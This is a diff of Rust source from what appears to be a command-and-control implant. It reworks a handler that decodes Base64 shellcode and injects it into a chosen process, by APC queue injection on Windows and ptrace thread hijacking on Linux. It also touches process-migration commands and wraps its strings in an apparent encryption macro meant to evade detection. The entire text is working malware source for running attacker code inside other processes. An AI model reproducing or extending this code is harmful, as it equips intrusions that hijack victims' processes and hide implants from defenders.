@@ -21,20 +21,26 @@ pub async fn handle_injection(cmd: String) -> (String, String, i32) {
         (_, Err(_)) => return (String::new(), aes_str!("Invalid Base64 Shellcode"), 1),
     };
     let code_len = shellcode.len();
+    // Platform-appropriate remote technique: APC queue injection on
+    // Windows, ptrace thread hijack on Linux. (catch_unwind is not used:
+    // the release profile sets panic="abort", so it can never catch - a
+    // panic in a debug build surfaces as a JoinError instead.)
     let task_result = tokio::task::spawn_blocking(move || {
-        std::panic::catch_unwind(|| injection::inject_remote_apc(pid, &shellcode))
+        #[cfg(target_os = "windows")]
+        { injection::inject_remote_apc(pid, &shellcode) }
+        #[cfg(not(target_os = "windows"))]
+        { injection::inject_remote_hijack(pid, &shellcode) }
     }).await;
     match task_result {
-        Ok(Ok(Ok(_)))  => (format!("{} {} {} {}", aes_str!("Success: Injected"), code_len, aes_str!("bytes into PID"), pid), String::new(), 0),
-        Ok(Ok(Err(e))) => (String::new(), format!("{}: {}", aes_str!("Injection Failed"), e), 1),
-        Ok(Err(_))     => (String::new(), aes_str!("Injection Panic: Caught critical failure in injection module."), 1),
-        Err(e)         => (String::new(), format!("{}: {}", aes_str!("Task execution failed"), e), 1),
+        Ok(Ok(_))  => (format!("{} {} {} {}", aes_str!("Success: Injected"), code_len, aes_str!("bytes into PID"), pid), String::new(), 0),
+        Ok(Err(e)) => (String::new(), format!("{}: {}", aes_str!("Injection Failed"), e), 1),
+        Err(e)     => (String::new(), format!("{}: {}", aes_str!("Task execution failed"), e), 1),
     }
 }
 
 // ── Process Migration ──────────────────────────────────────────────────
 
-pub fn handle_migrate_spawn(ctx: &HandlerContext, binary: &str, req_id: u64) -> DispatchResult {
+pub(crate) fn handle_migrate_spawn(ctx: &HandlerContext, binary: &str, req_id: u64) -> DispatchResult {
     let binary = binary.trim().to_string();
     let desc = format!("{} {}", aes_str!("migrate:spawn"), binary);
     let job_id = lock_or_action!(ctx.job_manager, aes_str!("job_manager")).spawn(desc, req_id, move |sink| {
@@ -56,7 +62,7 @@ pub fn handle_migrate_spawn(ctx: &HandlerContext, binary: &str, req_id: u64) -> 
     DispatchResult::Reply(format!("{} {}", aes_str!("Migration launched as Job"), job_id), String::new(), 0, AgentAction::None)
 }
 
-pub fn handle_migrate_inject(ctx: &HandlerContext, args: &str, req_id: u64) -> DispatchResult {
+pub(crate) fn handle_migrate_inject(ctx: &HandlerContext, args: &str, req_id: u64) -> DispatchResult {
     let pid = args.trim().parse::<u32>().unwrap_or(0);
     if pid == 0 {
         return DispatchResult::Reply(String::new(), aes_str!("Usage: migrate:inject <pid>"), 1, AgentAction::None);
